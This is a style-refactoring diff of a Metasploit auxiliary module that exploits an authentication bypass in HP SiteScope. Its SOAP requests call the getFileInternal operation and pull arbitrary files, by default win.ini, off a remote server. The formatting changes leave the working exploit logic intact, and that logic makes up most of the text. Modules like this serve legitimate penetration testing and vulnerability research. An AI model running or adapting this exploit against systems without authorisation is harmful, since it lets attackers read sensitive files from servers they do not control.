@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,21 +7,20 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
-      'Name'         => 'HP SiteScope SOAP Call getFileInternal Remote File Access',
-      'Description'  =>  %q{
+      'Name' => 'HP SiteScope SOAP Call getFileInternal Remote File Access',
+      'Description' => %q(
           This module exploits an authentication bypass vulnerability in HP SiteScope to
         retrieve an arbitrary file from the remote server. It is accomplished by calling
         the getFileInternal operation available through the APISiteScopeImpl AXIS service.
         This module has been successfully tested on HP SiteScope 11.20 over Windows 2003
         SP2 and Linux Centos 6.3.
-      },
+      ),
       'References'   =>
         [
           [ 'OSVDB', '85119' ],
@@ -36,27 +36,27 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options(
-    [
-      Opt::RPORT(8080),
-      OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
-      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
-    ], self.class)
+      [
+        Opt::RPORT(8080),
+        OptString.new('RFILE', [true, 'Remote File', 'c:\\windows\\win.ini']),
+        OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
+      ], self.class
+    )
 
     register_autofilter_ports([ 8080 ])
     deregister_options('RHOST')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     @uri = normalize_uri(target_uri.path)
-    @uri << '/' if @uri[-1,1] != '/'
+    @uri << '/' if @uri[-1, 1] != '/'
 
     print_status("Connecting to SiteScope SOAP Interface")
 
-    res = send_request_cgi({
-      'uri'     => "#{@uri}services/APISiteScopeImpl",
-      'method'  => 'GET'})
+    res = send_request_cgi('uri' => "#{@uri}services/APISiteScopeImpl",
+                           'method' => 'GET')
 
-    if not res
+    unless res
       print_error("Unable to connect")
       return
     end
@@ -94,19 +94,20 @@ class MetasploitModule < Msf::Auxiliary
     data << "</wsns0:Envelope>"
 
     res = send_request_cgi({
-      'uri'      => "#{@uri}services/APISiteScopeImpl",
-      'method'   => 'POST',
-      'ctype'    => 'text/xml; charset=UTF-8',
-      'data'     => data,
-      'headers'  => {
-        'SOAPAction'    => '""',
-    }}, 60)
+                             'uri' => "#{@uri}services/APISiteScopeImpl",
+                             'method'   => 'POST',
+                             'ctype'    => 'text/xml; charset=UTF-8',
+                             'data'     => data,
+                             'headers'  => {
+                               'SOAPAction' => '""'
+                             }
+                           }, 60)
 
-    if res and res.code == 500 and res.body =~ /<ns3:hostname xmlns:ns3="http:\/\/xml.apache.org\/axis\/">(.*)<\/ns3:hostname>/m
-      host_name = $1
+    if res && (res.code == 500) && res.body =~ /<ns3:hostname xmlns:ns3="http:\/\/xml.apache.org\/axis\/">(.*)<\/ns3:hostname>/m
+      host_name = Regexp.last_match(1)
     end
 
-    if not host_name or host_name.empty?
+    if !host_name || host_name.empty?
       print_error("Failed to retrieve the host name")
       return
     end
@@ -137,37 +138,32 @@ class MetasploitModule < Msf::Auxiliary
     data << "</wsns0:Body>" + "\r\n"
     data << "</wsns0:Envelope>"
 
-    res = send_request_cgi({
-      'uri'      => "#{@uri}services/APISiteScopeImpl",
-      'method'   => 'POST',
-      'ctype'    => 'text/xml; charset=UTF-8',
-      'data'     => data,
-      'headers'  => {
-        'SOAPAction'    => '""',
-    }})
+    res = send_request_cgi('uri' => "#{@uri}services/APISiteScopeImpl",
+                           'method'   => 'POST',
+                           'ctype'    => 'text/xml; charset=UTF-8',
+                           'data'     => data,
+                           'headers'  => {
+                             'SOAPAction' => '""'
+                           })
 
-    if res and res.code == 200
+    if res && (res.code == 200)
 
-      if res.headers['Content-Type'] =~ /boundary="(.*)"/
-        boundary = $1
-      end
-      if not boundary or boundary.empty?
+      boundary = Regexp.last_match(1) if res.headers['Content-Type'] =~ /boundary="(.*)"/
+      if !boundary || boundary.empty?
         print_error("Failed to retrieve the file contents")
         return
       end
 
-      if res.body =~ /getFileInternalReturn href="cid:([A-F0-9]*)"/
-        cid = $1
-      end
-      if not cid or cid.empty?
+      cid = Regexp.last_match(1) if res.body =~ /getFileInternalReturn href="cid:([A-F0-9]*)"/
+      if !cid || cid.empty?
         print_error("Failed to retrieve the file contents")
         return
       end
 
       if res.body =~ /#{cid}>\r\n\r\n(.*)\r\n--#{boundary}/m
-        loot = Rex::Text.ungzip($1)
+        loot = Rex::Text.ungzip(Regexp.last_match(1))
       end
-      if not loot or loot.empty?
+      if !loot || loot.empty?
         print_error("Failed to retrieve the file contents")
         return
       end
@@ -180,6 +176,4 @@ class MetasploitModule < Msf::Auxiliary
 
     print_error("Failed to retrieve the file contents")
   end
-
 end
-
